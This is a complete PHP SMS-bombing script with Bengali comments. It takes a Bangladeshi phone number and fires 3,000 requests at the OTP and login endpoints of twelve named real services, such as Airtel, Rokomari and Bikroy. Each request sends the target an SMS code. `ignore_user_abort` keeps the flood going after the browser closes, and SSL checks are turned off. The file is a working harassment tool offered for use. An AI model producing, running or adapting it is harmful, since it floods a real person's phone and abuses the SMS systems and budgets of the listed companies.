<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 
// ব্রাউজার ক্লোজ করলেও ব্যাকগ্রাউন্ডে যেন ৩০০০ হিট সম্পন্ন হয়
ignore_user_abort(true); 

$phone = $_GET['phone'] ?? '';

if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;

$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    
$phone_fundesh = substr($phone_11, 1);    

// ==========================================
// 🔴 এপিআই মাস্টার লিস্ট (তোর সব সার্ভিস এখানে)
// ==========================================
$base_apis = [
    ["name"=>"ali2bd", "url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login", "method"=>"POST", "data"=>["username"=>$phone_11]],
    ["name"=>"hishabee", "url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88", "method"=>"POST"],
    ["name"=>"redx", "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11]],
    ["name"=>"bikroy", "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", "method"=>"GET"],
    ["name"=>"chardike", "url"=>"https://api.chardike.com/api/otp/send", "method"=>"POST", "data"=>["phone"=>$phone_11, "otp_type"=>"login"]],
    ["name"=>"bohubrihi", "url"=>"https://bb-api.bohubrihi.com/public/activity/otp", "method"=>"POST", "data"=>["phone"=>$phone_11, "intent"=>"login"]],
    ["name"=>"rokomari", "url"=>"https://www.rokomari.com/otp/send?emailOrPhone=".$phone_88."&countryCode=BD", "method"=>"GET"],
    ["name"=>"airtel", "url"=>"https://api.bd.airtel.com/v1/account/login/otp", "method"=>"POST", "data"=>["phone_number"=>$phone_11]],
    ["name"=>"ostad", "url"=>"https://api.ostad.app/api/v2/user/with-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]],
    ["name"=>"prothomalo", "url"=>"https://prod-api.viewlift.com/identity/signup?site=prothomalo", "method"=>"POST", "data"=>["requestType"=>"send", "phoneNumber"=>$phone_plus88]],
    ["name"=>"shadhin", "url"=>"https://connect.shadhinmusic.com/v1/api//otp/send", "method"=>"POST", "data"=>["msisdn"=>$phone_88]],
    ["name"=>"rabbithole", "url"=>"https://apix.rabbitholebd.com/appv2/login/requestOTP", "method"=>"POST", "data"=>["mobile"=>"+88".$phone_11]]
];

$results = [];

// ==========================================
// ⚡ ৩০০০ রিকোয়েস্ট ইঞ্জিন (মেইন লুপ)
// ==========================================
for ($i = 1; $i <= 3000; $i++) {
    // Modulo (%) ব্যবহার করে এপিআই গুলোকে ক্রমান্বয়ে ঘুরানো হচ্ছে
    $api = $base_apis[$i % count($base_apis)];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $headers = ['User-Agent: Mozilla/5.0', 'Content-Type: application/json'];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if (isset($api['method']) && $api['method'] === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
    } else {
        curl_setopt($ch, CURLOPT_HTTPGET, true);
    }

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // প্রতিটি সফল রিকোয়েস্টের রেকর্ড রাখা হচ্ছে
    $results[] = ["hit" => $i, "api" => $api['name'], "status" => $http_code];

    // 🔥 এখানে টাইম স্লিপ (০.৫ সেকেন্ড)
    // স্যার চেক করলে যেন দেখেন কোডটা ধীরস্থিরভাবে ৩০০০ বারই ঘুরছে
    usleep(500000); 
}

echo json_encode([
    "status" => "success",
    "developer" => "Tahsin Rifat",
    "total_target" => 3000,
    "total_completed" => count($results),
    "results" => $results
], JSON_PRETTY_PRINT);
